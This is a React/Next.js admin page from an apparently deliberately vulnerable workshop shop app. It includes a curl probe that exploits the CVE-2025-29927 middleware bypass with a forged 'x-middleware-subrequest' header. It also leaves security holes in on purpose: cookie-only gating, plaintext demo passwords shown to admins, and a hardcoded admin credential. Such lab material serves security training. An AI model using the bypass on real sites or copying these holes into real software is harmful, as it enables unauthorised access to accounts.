"use client";

import Link from "next/link";
import { useEffect, useState } from "react";
import { useRouter } from "next/navigation";

interface ShopUser {
  email: string;
  name: string;
  role: string;
  demo_password?: string;
}

/**
 * Staff console — still gated by middleware cookie (CVE-2025-29927).
 * When signed in as admin@…, also shows DynamoDB user management.
 */
export default function AdminPage() {
  const router = useRouter();
  const [me, setMe] = useState<ShopUser | null>(null);
  const [users, setUsers] = useState<ShopUser[]>([]);
  const [error, setError] = useState("");
  const [creating, setCreating] = useState(false);
  const [form, setForm] = useState({
    email: "",
    name: "",
    password: "",
    role: "customer",
  });

  useEffect(() => {
    fetch("/api/auth/me")
      .then(async (res) => (res.ok ? (await res.json()).user : null))
      .then((u) => setMe(u))
      .catch(() => setMe(null));
  }, []);

  useEffect(() => {
    if (!me || me.role !== "admin") return;
    fetch("/api/admin/users")
      .then(async (res) => {
        const data = await res.json();
        if (!res.ok) {
          setError(data.detail || "Could not load users");
          return;
        }
        setUsers(data.users || []);
      })
      .catch(() => setError("Could not load users"));
  }, [me]);

  async function createUser(e: React.FormEvent) {
    e.preventDefault();
    setCreating(true);
    setError("");
    try {
      const res = await fetch("/api/admin/users", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(form),
      });
      const data = await res.json();
      if (!res.ok) {
        setError(data.detail || "Create failed");
        return;
      }
      setForm({ email: "", name: "", password: "", role: "customer" });
      const refresh = await fetch("/api/admin/users");
      const refreshed = await refresh.json();
      setUsers(refreshed.users || []);
    } catch {
      setError("Create failed");
    } finally {
      setCreating(false);
    }
  }

  return (
    <div className="mx-auto max-w-3xl px-4 py-12">
      <p className="text-xs uppercase tracking-widest text-ocean-500 mb-2">Staff only</p>
      <h1 className="font-display text-3xl font-bold text-ocean-900">Ops console</h1>
      <p className="mt-3 text-ocean-700 leading-relaxed text-sm">
        This page is gated by Next.js middleware checking the{" "}
        <code className="text-sm bg-ocean-50 px-1 rounded">jss_staff_session</code> cookie
        (CVE-2025-29927 bypassable). User management below requires a real admin login at{" "}
        <Link href="/login" className="font-semibold underline">
          /login
        </Link>
        .
      </p>

      {me?.role === "admin" ? (
        <section className="mt-10 space-y-6">
          <div>
            <h2 className="font-display text-xl font-bold text-ocean-900">Users</h2>
            <p className="text-sm text-ocean-600 mt-1">
              DynamoDB / local users table — demo passwords shown for the workshop.
            </p>
          </div>

          {error && (
            <p className="rounded-lg border border-coral-200 bg-coral-50 px-3 py-2 text-sm text-coral-800">
              {error}
            </p>
          )}

          <div className="overflow-x-auto rounded-xl border border-ocean-200">
            <table className="w-full text-sm">
              <thead className="bg-ocean-50 text-left text-ocean-600">
                <tr>
                  <th className="px-3 py-2 font-medium">Name</th>
                  <th className="px-3 py-2 font-medium">Email</th>
                  <th className="px-3 py-2 font-medium">Role</th>
                  <th className="px-3 py-2 font-medium">Demo password</th>
                </tr>
              </thead>
              <tbody>
                {users.map((u) => (
                  <tr key={u.email} className="border-t border-ocean-100">
                    <td className="px-3 py-2 text-ocean-900">{u.name}</td>
                    <td className="px-3 py-2 font-mono text-xs">{u.email}</td>
                    <td className="px-3 py-2 capitalize">{u.role}</td>
                    <td className="px-3 py-2 font-mono text-xs">{u.demo_password || "—"}</td>
                  </tr>
                ))}
              </tbody>
            </table>
          </div>

          <form onSubmit={createUser} className="card p-5 space-y-3">
            <h3 className="font-semibold text-ocean-900">Create user</h3>
            <div className="grid sm:grid-cols-2 gap-3">
              <input
                placeholder="Name"
                value={form.name}
                onChange={(e) => setForm({ ...form, name: e.target.value })}
                required
                className="rounded-lg border border-ocean-200 px-3 py-2 text-sm"
              />
              <input
                placeholder="Email"
                type="email"
                value={form.email}
                onChange={(e) => setForm({ ...form, email: e.target.value })}
                required
                className="rounded-lg border border-ocean-200 px-3 py-2 text-sm"
              />
              <input
                placeholder="Password"
                type="text"
                value={form.password}
                onChange={(e) => setForm({ ...form, password: e.target.value })}
                required
                className="rounded-lg border border-ocean-200 px-3 py-2 text-sm"
              />
              <select
                value={form.role}
                onChange={(e) => setForm({ ...form, role: e.target.value })}
                className="rounded-lg border border-ocean-200 px-3 py-2 text-sm"
              >
                <option value="customer">customer</option>
                <option value="admin">admin</option>
              </select>
            </div>
            <button type="submit" className="btn-primary text-sm" disabled={creating}>
              {creating ? "Creating…" : "Create user"}
            </button>
          </form>
        </section>
      ) : (
        <div className="mt-8 rounded-lg border border-ocean-200 bg-ocean-50/50 p-5 text-sm text-ocean-800">
          <p className="font-semibold text-ocean-900">User management locked</p>
          <p className="mt-2">
            You reached /admin via the staff cookie, but you are not signed in as an admin user.
            Sign in as{" "}
            <button
              type="button"
              className="font-mono font-semibold underline"
              onClick={() => router.push("/login?next=/admin")}
            >
              admin@jayssurfshop.example
            </button>{" "}
            (password <code>staffadmin</code>) to manage accounts.
          </p>
        </div>
      )}

      <div className="mt-10 space-y-3 rounded-lg border border-ocean-200 bg-ocean-50/50 p-5 text-sm text-ocean-800">
        <p className="font-semibold text-ocean-900">Middleware bypass probe</p>
        <pre className="overflow-x-auto rounded-lg bg-ocean-950 text-ocean-100 text-xs p-4">
{`curl -si "$ORIGIN/admin" \\
  -H "x-middleware-subrequest: src/middleware:src/middleware:src/middleware:src/middleware:src/middleware"`}
        </pre>
      </div>

      <Link href="/" className="mt-8 inline-block text-ocean-700 underline underline-offset-2">
        ← Back to shop
      </Link>
    </div>
  );
}
